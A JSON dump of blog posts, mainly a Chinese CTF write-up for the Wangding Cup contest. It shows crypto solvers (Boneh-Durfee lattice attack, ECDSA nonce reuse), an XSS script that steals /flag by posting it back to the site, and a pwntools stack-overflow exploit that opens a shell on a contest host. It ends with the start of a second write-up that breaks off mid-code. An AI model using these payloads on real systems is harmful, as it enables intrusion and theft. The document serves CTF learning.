[{"content":"Crypto Crypto01（By Luminoria） 小华刚上班第一天，便发现自己的重要文件被加密，只留下了一段神秘代码，请你结合神秘代码帮助他解密。\n从附件得到题目源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from Crypto.Util.number import * from secret import flag p = getPrime(512) q = getPrime(512) n = p * q d = getPrime(299) e = inverse(d,(p-1)*(q-1)) m = bytes_to_long(flag) c = pow(m,e,n) hint1 = p \u0026gt;\u0026gt; (512-70) hint2 = q \u0026gt;\u0026gt; (512-70) print(f\u0026#34;n = {n}\u0026#34;) print(f\u0026#34;e = {e}\u0026#34;) print(f\u0026#34;c = {c}\u0026#34;) print(f\u0026#34;hint1 = {hint1}\u0026#34;) print(f\u0026#34;hint2 = {hint2}\u0026#34;) n = 114118679597315994458138232536029700477506764789782067073905766324635160145597602207164997807103187990046901850125798774503781767630201814025142189432534890147340404293319424524872695905368897290630698362559606549134377263394129199145835483978820237203114250882524438599220793209608842281879976692805855046971 e = 60930873636939710528141652371287627298970658591028170597199994159301433213017349592910581153194811053524011559886529831760967700162629319952838130973563991607758850226327915934518549584588693854388996425152821459866209334446088324204759334980239670811977086959854952233887459542997456604453766160444477603017 c = 11058775585296329544235824126670578486484201903851563493984057289075513008773878014007377223222464555346135675900619903617528838701118612201290486747980233570288315027654510774940371032813981282018787668864123759554297515664915358447425647424759926416629451915378248520432568536260902676664298855076689608823 hint1 = 884675140903190287932 hint2 = 1000130673738973880482 根据检索，发现是RSA高位爆破题目，并且在2023江苏省领航杯有对应的题目，而且非常凑巧的是师傅写了个傻瓜脚本\nhttps://www.cnblogs.com/mumuhhh/p/17789591.html#bd\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 import time time.clock = time.time debug = True strict = False helpful_only = True dimension_min = 7 # 如果晶格达到该尺寸，则停止移除 # 显示有用矢量的统计数据 def helpful_vectors(BB, modulus): nothelpful = 0 for ii in range(BB.dimensions()[0]): if BB[ii,ii] \u0026gt;= modulus: nothelpful += 1 print (nothelpful, \u0026#34;/\u0026#34;, BB.dimensions()[0], \u0026#34; vectors are not helpful\u0026#34;) # 显示带有 0 和 X 的矩阵 def matrix_overview(BB, bound): for ii in range(BB.dimensions()[0]): a = (\u0026#39;%02d \u0026#39; % ii) for jj in range(BB.dimensions()[1]): a += \u0026#39;0\u0026#39; if BB[ii,jj] == 0 else \u0026#39;X\u0026#39; if BB.dimensions()[0] \u0026lt; 60: a += \u0026#39; \u0026#39; if BB[ii, ii] \u0026gt;= bound: a += \u0026#39;~\u0026#39; #print (a) # 尝试删除无用的向量 # 从当前 = n-1（最后一个向量）开始 def remove_unhelpful(BB, monomials, bound, current): # 我们从当前 = n-1（最后一个向量）开始 if current == -1 or BB.dimensions()[0] \u0026lt;= dimension_min: return BB # 开始从后面检查 for ii in range(current, -1, -1): # 如果它没有用 if BB[ii, ii] \u0026gt;= bound: affected_vectors = 0 affected_vector_index = 0 # 让我们检查它是否影响其他向量 for jj in range(ii + 1, BB.dimensions()[0]): # 如果另一个向量受到影响： # 我们增加计数 if BB[jj, ii] != 0: affected_vectors += 1 affected_vector_index = jj # 等级：0 # 如果没有其他载体最终受到影响 # 我们删除它 if affected_vectors == 0: #print (\u0026#34;* removing unhelpful vector\u0026#34;, ii) BB = BB.delete_columns([ii]) BB = BB.delete_rows([ii]) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # 等级：1 #如果只有一个受到影响，我们会检查 # 如果它正在影响别的向量 elif affected_vectors == 1: affected_deeper = True for kk in range(affected_vector_index + 1, BB.dimensions()[0]): # 如果它影响哪怕一个向量 # 我们放弃这个 if BB[kk, affected_vector_index] != 0: affected_deeper = False # 如果没有其他向量受到影响，则将其删除，并且 # 这个有用的向量不够有用 #与我们无用的相比 if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) \u0026lt; abs(bound - BB[ii, ii]): #print (\u0026#34;* removing unhelpful vectors\u0026#34;, ii, \u0026#34;and\u0026#34;, affected_vector_index) BB = BB.delete_columns([affected_vector_index, ii]) BB = BB.delete_rows([affected_vector_index, ii]) monomials.pop(affected_vector_index) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # nothing happened return BB \u0026#34;\u0026#34;\u0026#34; Returns: * 0,0 if it fails * -1，-1 如果 \u0026#34;strict=true\u0026#34;，并且行列式不受约束 * x0,y0 the solutions of `pol` \u0026#34;\u0026#34;\u0026#34; def boneh_durfee(pol, modulus, mm, tt, XX, YY): \u0026#34;\u0026#34;\u0026#34; Boneh and Durfee revisited by Herrmann and May 在以下情况下找到解决方案： * d \u0026lt; N^delta * |x|\u0026lt; e^delta * |y|\u0026lt; e^0.5 每当 delta \u0026lt; 1 - sqrt（2）/2 ~ 0.292 \u0026#34;\u0026#34;\u0026#34; # substitution (Herrman and May) PR.\u0026lt;u, x, y\u0026gt; = PolynomialRing(ZZ) #多项式环 Q = PR.quotient(x*y + 1 - u) # u = xy + 1 polZ = Q(pol).lift() UU = XX*YY + 1 # x-移位 gg = [] for kk in range(mm + 1): for ii in range(mm - kk + 1): xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk gg.append(xshift) gg.sort() # 单项式 x 移位列表 monomials = [] for polynomial in gg: for monomial in polynomial.monomials(): #对于多项式中的单项式。单项式（）： if monomial not in monomials: # 如果单项不在单项中 monomials.append(monomial) monomials.sort() # y-移位 for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk) yshift = Q(yshift).lift() gg.append(yshift) # substitution # 单项式 y 移位列表 for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): monomials.append(u^kk * y^jj) # 构造格 B nn = len(monomials) BB = Matrix(ZZ, nn) for ii in range(nn): BB[ii, 0] = gg[ii](0, 0, 0) for jj in range(1, ii + 1): if monomials[jj] in gg[ii].monomials(): BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY) #约化格的原型 if helpful_only: # #自动删除 BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1) # 重置维度 nn = BB.dimensions()[0] if nn == 0: print (\u0026#34;failure\u0026#34;) return 0,0 # 检查向量是否有帮助 if debug: helpful_vectors(BB, modulus^mm) # 检查行列式是否正确界定 det = BB.det() bound = modulus^(mm*nn) if det \u0026gt;= bound: print (\u0026#34;We do not have det \u0026lt; bound. Solutions might not be found.\u0026#34;) print (\u0026#34;Try with highers m and t.\u0026#34;) if debug: diff = (log(det) - log(bound)) / log(2) print (\u0026#34;size det(L) - size e^(m*n) = \u0026#34;, floor(diff)) if strict: return -1, -1 else: print (\u0026#34;det(L) \u0026lt; e^(m*n) (good! If a solution exists \u0026lt; N^delta, it will be found)\u0026#34;) # display the lattice basis if debug: matrix_overview(BB, modulus^mm) # LLL if debug: print (\u0026#34;optimizing basis of the lattice via LLL, this can take a long time\u0026#34;) #BB = BB.BKZ(block_size=25) BB = BB.LLL() if debug: print (\u0026#34;LLL is done!\u0026#34;) # 替换向量 i 和 j -\u0026gt;多项式 1 和 2 if debug: print (\u0026#34;在格中寻找线性无关向量\u0026#34;) found_polynomials = False for pol1_idx in range(nn - 1): for pol2_idx in range(pol1_idx + 1, nn): # 对于i and j, 构造两个多项式 PR.\u0026lt;w,z\u0026gt; = PolynomialRing(ZZ) pol1 = pol2 = 0 for jj in range(nn): pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY) pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY) # 结果 PR.\u0026lt;q\u0026gt; = PolynomialRing(ZZ) rr = pol1.resultant(pol2) if rr.is_zero() or rr.monomials() == [1]: continue else: print (\u0026#34;found them, using vectors\u0026#34;, pol1_idx, \u0026#34;and\u0026#34;, pol2_idx) found_polynomials = True break if found_polynomials: break if not found_polynomials: print (\u0026#34;no independant vectors could be found. This should very rarely happen...\u0026#34;) return 0, 0 rr = rr(q, q) # solutions soly = rr.roots() if len(soly) == 0: print (\u0026#34;Your prediction (delta) is too small\u0026#34;) return 0, 0 soly = soly[0][0] ss = pol1(q, soly) solx = ss.roots()[0][0] return solx, soly def example(): ############################################ # 随机生成数据 ########################################## #start_time =time.perf_counter start =time.clock() size=512 length_N = 2*size; ss=0 s=70; M=1 # the number of experiments delta = 299/1024 # p = random_prime(2^512,2^511) for i in range(M): # p = random_prime(2^size,None,2^(size-1)) # q = random_prime(2^size,None,2^(size-1)) # if(p\u0026lt;q): # temp=p # p=q # q=temp N = e = c = hint1 = # p高位 hint2 = # q高位 # print (\u0026#34;p真实高\u0026#34;,s,\u0026#34;比特：\u0026#34;, int(p/2^(512-s))) # print (\u0026#34;q真实高\u0026#34;,s,\u0026#34;比特：\u0026#34;, int(q/2^(512-s))) # N = p*q; # 解密指数d的指数( 最大0.292) m = 7 # 格大小（越大越好/越慢） t = round(((1-2*delta) * m)) # 来自 Herrmann 和 May 的优化 X = floor(N^delta) # Y = floor(N^(1/2)/2^s) # 如果 p、 q 大小相同，则正确 for l in range(int(hint1),int(hint1)+1): print(\u0026#39;\\n\\n\\n l=\u0026#39;,l) pM=l; p0=pM*2^(size-s)+2^(size-s)-1; q0=N/p0; qM=int(q0/2^(size-s)) A = N + 1-pM*2^(size-s)-qM*2^(size-s); #A = N+1 P.\u0026lt;x,y\u0026gt; = PolynomialRing(ZZ) pol = 1 + x * (A + y) #构建的方程 # Checking bounds #if debug: #print (\u0026#34;=== 核对数据 ===\u0026#34;) #print (\u0026#34;* delta:\u0026#34;, delta) #print (\u0026#34;* delta \u0026lt; 0.292\u0026#34;, delta \u0026lt; 0.292) #print (\u0026#34;* size of e:\u0026#34;, ceil(log(e)/log(2))) # e的bit数 # print (\u0026#34;* size of N:\u0026#34;, len(bin(N))) # N的bit数 #print (\u0026#34;* size of N:\u0026#34;, ceil(log(N)/log(2))) # N的bit数 #print (\u0026#34;* m:\u0026#34;, m, \u0026#34;, t:\u0026#34;, t) # boneh_durfee if debug: ##print (\u0026#34;=== running algorithm ===\u0026#34;) start_time = time.time() solx, soly = boneh_durfee(pol, e, m, t, X, Y) if solx \u0026gt; 0: #print (\u0026#34;=== solution found ===\u0026#34;) if False: print (\u0026#34;x:\u0026#34;, solx) print (\u0026#34;y:\u0026#34;, soly) d_sol = int(pol(solx, soly) / e) ss=ss+1 print (\u0026#34;=== solution found ===\u0026#34;) print (\u0026#34;p的高比特为：\u0026#34;,l) print (\u0026#34;q的高比特为：\u0026#34;,qM) print (\u0026#34;d=\u0026#34;,d_sol) if debug: print(\u0026#34;=== %s seconds ===\u0026#34; % (time.time() - start_time)) #break print(\u0026#34;ss=\u0026#34;,ss) #end=time.process_time end=time.clock() print(\u0026#39;Running time: %s Seconds\u0026#39;%(end-start)) if __name__ == \u0026#34;__main__\u0026#34;: example() 所以把数据填进去，经过四十秒的紧张计算就得到了d\nd=697791299328204454525050115930116025227680411125210507143694169686384063060766101784129969\n然后来个经典的RSA解密脚本\n1 2 3 4 5 6 7 8 from Crypto.Util.number import * n = 114118679597315994458138232536029700477506764789782067073905766324635160145597602207164997807103187990046901850125798774503781767630201814025142189432534890147340404293319424524872695905368897290630698362559606549134377263394129199145835483978820237203114250882524438599220793209608842281879976692805855046971 d = 697791299328204454525050115930116025227680411125210507143694169686384063060766101784129969 c = 11058775585296329544235824126670578486484201903851563493984057289075513008773878014007377223222464555346135675900619903617528838701118612201290486747980233570288315027654510774940371032813981282018787668864123759554297515664915358447425647424759926416629451915378248520432568536260902676664298855076689608823 m = pow(c,d,n) print(long_to_bytes(m)) 解出flag为wdflag{c5b3e498-0f4c-4f40-937f-e690d8062b89}\nCrypto02（By Luminoria） 运维人员在网络监控中发现了一段可疑的字符串，经过初步分析，他们怀疑这段数据可能是使用AES加密的。为了确定这段数据的内容，他们需要找到正确的密钥。\n题目源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 # coding: utf-8 #!/usr/bin/env python2 import gmpy2 import random import binascii from hashlib import sha256 from sympy import nextprime from Crypto.Cipher import AES from Crypto.Util.Padding import pad from Crypto.Util.number import long_to_bytes from FLAG import flag #flag = \u0026#39;wdflag{123}\u0026#39; def victory_encrypt(plaintext, key): key = key.upper() key_length = len(key) plaintext = plaintext.upper() ciphertext = \u0026#39;\u0026#39; for i, char in enumerate(plaintext): if char.isalpha(): shift = ord(key[i % key_length]) - ord(\u0026#39;A\u0026#39;) encrypted_char = chr((ord(char) - ord(\u0026#39;A\u0026#39;) + shift) % 26 + ord(\u0026#39;A\u0026#39;)) ciphertext += encrypted_char else: ciphertext += char return ciphertext victory_key = \u0026#34;WANGDINGCUP\u0026#34; victory_encrypted_flag = victory_encrypt(flag, victory_key) p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f a = 0 b = 7 xG = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798 yG = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8 G = (xG, yG) n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141 h = 1 zero = (0,0) dA = nextprime(random.randint(0, n)) if dA \u0026gt; n: print(\u0026#34;warning!!\u0026#34;) def addition(t1, t2): if t1 == zero: return t2 if t2 == zero: return t2 (m1, n1) = t1 (m2, n2) = t2 if m1 == m2: if n1 == 0 or n1 != n2: return zero else: k = (3 * m1 * m1 + a) % p * gmpy2.invert(2 * n1 , p) % p else: k = (n2 - n1 + p) % p * gmpy2.invert((m2 - m1 + p) % p, p) % p m3 = (k * k % p - m1 - m2 + p * 2) % p n3 = (k * (m1 - m3) % p - n1 + p) % p return (int(m3),int(n3)) def multiplication(x, k): ans = zero t = 1 while(t \u0026lt;= k): if (k \u0026amp;t )\u0026gt;0: ans = addition(ans, x) x = addition(x, x) t \u0026lt;\u0026lt;= 1 return ans def getrs(z, k): (xp, yp) = P r = xp s = (z + r * dA % n) % n * gmpy2.invert(k, n) % n return r,s z1 = random.randint(0, p) z2 = random.randint(0, p) k = random.randint(0, n) P = multiplication(G, k) hA = multiplication(G, dA) r1, s1 = getrs(z1, k) r2, s2 = getrs(z2, k) print(\u0026#34;r1 = {}\u0026#34;.format(r1)) print(\u0026#34;r2 = {}\u0026#34;.format(r2)) print(\u0026#34;s1 = {}\u0026#34;.format(s1)) print(\u0026#34;s2 = {}\u0026#34;.format(s2)) print(\u0026#34;z1 = {}\u0026#34;.format(z1)) print(\u0026#34;z2 = {}\u0026#34;.format(z2)) key = sha256(long_to_bytes(dA)).digest() cipher = AES.new(key, AES.MODE_CBC) iv = cipher.iv encrypted_flag = cipher.encrypt(pad(victory_encrypted_flag.encode(), AES.block_size)) encrypted_flag_hex = binascii.hexlify(iv + encrypted_flag).decode(\u0026#39;utf-8\u0026#39;) print(\u0026#34;Encrypted flag (AES in CBC mode, hex):\u0026#34;, encrypted_flag_hex) # output # r1 = 111817653331957669294460466848850458804857945556928458406600106150268654577388 # r2 = 111817653331957669294460466848850458804857945556928458406600106150268654577388 # s1 = 86614391420642776223990568523561232627667766343605236785504627521619587526774 # s2 = 99777373725561160499828739472284705447694429465579067222876023876942075279416 # z1 = 96525870193778873849147733081234547336150390817999790407096946391065286856874 # z2 = 80138688082399628724400273131729065525373481983222188646486307533062536927379 # (\u0026#39;Encrypted flag (AES in CBC mode, hex):\u0026#39;, u\u0026#39;6c201c3c4e8b0a2cdd0eca11e7101d45d7b33147d27ad1b9d57e3d1e20c7b3c2e36b8da3142dfd5abe335a604ce7018878b9f157099211a7bbda56ef5285ec0b\u0026#39;) 题目说的是AES加密，而且可以看到这里面还融合了其他的加密，然后我们写出解密脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 import gmpy2 import binascii from hashlib import sha256 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad from Crypto.Util.number import long_to_bytes # Parameters from the original code p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F a = 0 b = 7 xG = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798 yG = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8 G = (xG, yG) n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 h = 1 zero = (0, 0) # From the provided values r1 = 111817653331957669294460466848850458804857945556928458406600106150268654577388 r2 = 111817653331957669294460466848850458804857945556928458406600106150268654577388 s1 = 86614391420642776223990568523561232627667766343605236785504627521619587526774 s2 = 99777373725561160499828739472284705447694429465579067222876023876942075279416 z1 = 96525870193778873849147733081234547336150390817999790407096946391065286856874 z2 = 80138688082399628724400273131729065525373481983222188646486307533062536927379 # Calculate k k = (z1 - z2) * gmpy2.invert(s1 - s2, n) % n # Calculate dA dA = (s1 * k - z1) * gmpy2.invert(r1, n) % n # Generate AES key key = sha256(long_to_bytes(dA)).digest() # Decrypt the AES-CBC ciphertext encrypted_flag_hex = \u0026#34;6c201c3c4e8b0a2cdd0eca11e7101d45d7b33147d27ad1b9d57e3d1e20c7b3c2e36b8da3142dfd5abe335a604ce7018878b9f157099211a7bbda56ef5285ec0b\u0026#34; encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex) iv = encrypted_flag_bytes[:16] ciphertext = encrypted_flag_bytes[16:] cipher = AES.new(key, AES.MODE_CBC, iv) decrypted_flag = unpad(cipher.decrypt(ciphertext), AES.block_size) # Decrypt the Caesar cipher victory_key = \u0026#34;WANGDINGCUP\u0026#34; decrypted_flag_text = \u0026#34;\u0026#34; for char in decrypted_flag.decode(): if char.isalpha(): shift = ord(victory_key[len(decrypted_flag_text) % len(victory_key)]) - ord(\u0026#34;A\u0026#34;) decrypted_char = chr((ord(char) - ord(\u0026#34;A\u0026#34;) - shift) % 26 + ord(\u0026#34;A\u0026#34;)) decrypted_flag_text += decrypted_char else: decrypted_flag_text += char lower_flag = decrypted_flag_text.lower() print(\u0026#34;Decrypted flag:\u0026#34;, lower_flag) 运行后得到flag：wdflag{58ae00432d8228c9e3a927bbcd8d67d2}\nWeb Web02（By KeqingMoe） 某安全测试人员接到了一项重要任务：对一套无人机系统的后台进行安全测试。这套系统负责管理无人机的飞行、数据传输和任务调度，请您测试该后台是否安全。\n先试着随便输一个账号密码，发现直接登进去了\n在输入框输入一些东西，点更新，更新成功，然后返回，发现下面就多了一行字。\n写一点 html 交上去，发现可以。联系它说的点提交会审核清单，从而想到 XSS 攻击。\n经过简单地猜测，检查到 /flag 下有东西，访问，但得到“你是 boss 嘛？就想看其他无人机拟定执行任务？”从而想到用 xss 把 flag 拿到传回来\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; fetch(\u0026#39;/flag\u0026#39;) .then(data =\u0026gt; data.text()).then(data =\u0026gt; fetch(\u0026#39;/content/b279d32c6978a402f855956b080bb8a3\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; }, body: `content=${encodeURIComponent(data)}` } ) ).catch(error =\u0026gt; console.error(\u0026#39;Error: \u0026#39;, error) ) \u0026lt;/script\u0026gt; 从而拿到 flag 是 wdflag{z0b2pvf3fk1d77rks6a4y6fs5chn6sqh}\nMISC MISC03（By ZZPeng） 近日某公司服务器遭到恶意攻击，随后公司立即对流量监测系统中遭受攻击时段的流量进行了取证，但是公司某一网络安全实习生进行分析溯源后并未找到攻击者的攻击IP，于是公司决定将这个任务重新交给更具经验的你来进行，接手工作后，你立即对其进行了深入调查！\n先过滤http请求（http \u0026amp;\u0026amp; http.response.code != 404），然后发现有三个请求里面传了hacker.php，可以得到IP为39.168.5.60\nMISC04（By KeqingMoe） 某测试人员刚刚完成了一款图像加密算法的开发，想要邀请你进行深入的分析测试。\n图形很扭曲，并且似乎有规律可循。根据它的形状，想到 Peano 分形曲线\n搜索到一篇 IrisCTF2024 上的题目，也是 Peano 分形曲线处理过的图片的题，参考后得到如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 from PIL import Image from tqdm import tqdm def peano(n): if n == 0: return [[0, 0]] else: in_lst = peano(n - 1) lst = in_lst.copy() px, py = lst[-1] lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + 1 + i[0], py + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px - i[0], py - 1 - i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + i[0], py - 1 - i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + 1 + i[0], py + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px - i[0], py + 1 + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst) return lst order = peano(6) img = Image.open(\u0026#34;r.png\u0026#34;) width, height = img.size block_width = width block_height = height new_image = Image.new(\u0026#34;RGB\u0026#34;, (width, height)) for i, (x, y) in tqdm(enumerate(order)): new_x, new_y = i % width, i // width pixel = img.getpixel((x, height - 1 - y)) new_image.putpixel((new_x, new_y), pixel) new_image.save(\u0026#34;rr.jpg\u0026#34;) 处理后，得到一张图片，是一个二维码\n扫了得到 wdflag{dde235fa-114d-404c-8add-6007e6efabfd}\nPWN PWN02（By ZZPeng） IDA 静态分析得到用户名密码 admin, admin123\nvuln函数存在栈溢出漏洞\n发现后门函数gift, 字符串/bin/sh\n编写利用脚本 getshell\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * def exp(): context.log_level=\u0026#39;debug\u0026#39; context(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;) ELFpath = \u0026#39;./short\u0026#39; e = ELF(ELFpath) # p = process(ELFpath) p = remote(\u0026#39;0192d781680b7e11bd1fe073f5e5923d.el7z.dg10.ciihw.cn\u0026#39;, 46319) p.sendlineafter(\u0026#39;username: \u0026#39;, \u0026#39;admin\u0026#39;) p.sendlineafter(\u0026#39;password: \u0026#39;, \u0026#39;admin123\u0026#39;) buf = int(p.recvline_startswith(\u0026#39;You will input this: \u0026#39;).decode()[21:], 16) print (f\u0026#39;buf:{hex(buf)}\\n\u0026#39;) vuln = e.symbols[\u0026#39;vuln\u0026#39;] gift = e.symbols[\u0026#39;gift\u0026#39;] bin_sh = 0x0804A038 leave = 0x08048555 offset = 0x50 - 0x4*4 # gdb.attach(p) print (f\u0026#39;vuln:{hex(vuln)} gift:{hex(gift)}\u0026#39;) payload = b\u0026#39;aaaa\u0026#39;+p32(gift)+p32(0)+p32(bin_sh) p.sendafter(\u0026#39;plz input your msg:\u0026#39;, payload + cyclic(offset) +p32(buf) + p32(leave)) # p.sendafter(\u0026#39;plz input your msg:\u0026#39;, b\u0026#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae\u0026#39;) p.interactive() if __name__ == \u0026#39;__main__\u0026#39;: exp() wdflag{r6kghxuwgu60zb4q1rvp5943zak91ygf}\nReverse REVERSE01（By Jeremiah） IDA 打开可以看到 flag 被分成了 4 部分加密\n第一部分把用户输入的前 8 字节的两倍赋值给 s1\n第二部分把 input 的 8-16 字节和字符串 XorrLord 异或第三部分进行 base64 编码\n第四部分进行 AES 加密\n解密过程很简单，前两部分手逆即可\n这里注意一下有个换表操作\nAES 写个脚本即可\n最后把四个部分拼起来得到 flag: wdflag{9e855bae8f9aaafe9a2eb2cbd8823519}\n本篇文章由队长Luminoria编写\n","date":"2025-01-01T14:44:03+08:00","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9Bwriteup%E6%9C%80%E5%A5%BD%E3%81%AE%E4%B8%80%E5%8F%89%E6%A0%91%E4%BD%BF%E7%94%A8%E8%80%85/","title":"第四届网鼎杯网络安全大赛青龙组初赛writeup(最好の一叉树使用者)"},{"content":"","date":"2025-01-01T14:07:55+08:00","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/fridastudy/","title":"FridaStudy"},{"content":"ADCTF新生赛个人wp Reverse checkin IDA打开可以看到逻辑很简单 直接给出exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char encoded[30] = { 0x55, 0x17, 0xC9, 0xBB, 0x4A, 0xA5, 0x86, 0xDF, 0x24, 0x0A, 0x1C, 0xA3, 0x27, 0xA1, 0x57, 0x35, 0xC3, 0xDB, 0x91, 0x88, 0x6D, 0x91, 0xA0, 0xCC, 0x71, 0x57, 0x71, 0xE4, 0x40 }; char original_input[30]; int i; srand(0x7E8u); for (i = 0; i \u0026lt; 29; ++i) { original_input[i] = encoded[i] ^ rand(); } original_input[29] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;%s\\n\u0026#34;,original_input); return 0; } //flag{y0u_Know_rAnd0m_4nd_xOr} 注意需要在linux环境下运行(Windows和Linux下生成的随机数不同，附件为64位elf文件)\nezPy 下载附件后发现是个pyinstaller打包的python文件(可以通过图标辨别)，用pyinstxtractor解包得到main.pyc文件，用在线网站对pyc文件反编译(用本地的pycdc也可以解决)\n前面还有一段是密文数据，程序的逻辑就是每9个字节通过不同的表达式计算得到encoded数组，逆向思路只需要对这个方程组进行求解即可，采用z3约束求解器进行求解，exp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from z3 import * # Create a list of Z3 integer variables for the flag flag = [Int(f\u0026#34;flag_{i}\u0026#34;) for i in range(36)] # Create a solver solver = Solver() # The secret values from the original problem secret = [ 631, 1205, -500, 1021, 1879, 668, -281, 1651, 1326, 593, 428, -170, 515, 1302, 452, 41, 814, 379, 382, 629, 650, 273, 1529, 630, 418, 1207, 1076, 315, 1118, 469, 398, 1803, 647, 729, 1439, 1104 ] # Add constraints for each encoded value for i in range(0, 36, 9): solver.add(3 * flag[i] + 7 * flag[i + 1] - 2 * flag[i + 2] + 5 * flag[i + 3] - 6 * flag[i + 4] - 14 == secret[i]) solver.add(-5 * flag[i + 1] + 9 * flag[i + 2] + 4 * flag[i + 3] - 3 * flag[i + 4] + 7 * flag[i + 5] - 18 == secret[i + 1]) solver.add(6 * flag[i] - 4 * flag[i + 1] + 2 * flag[i + 2] - 9 * flag[i + 5] + 5 * flag[i + 6] - 25 == secret[i + 2]) solver.add(7 * flag[i + 1] + 3 * flag[i + 3] - 8 * flag[i + 4] + 6 * flag[i + 5] - 2 * flag[i + 6] + 4 * flag[i + 7] - 30 == secret[i + 3]) solver.add(2 * flag[i] + 5 * flag[i + 2] - 4 * flag[i + 4] + 7 * flag[i + 5] + 9 * flag[i + 8] - 20 == secret[i + 4]) solver.add(8 * flag[i] - 3 * flag[i + 1] + 5 * flag[i + 3] - 6 * 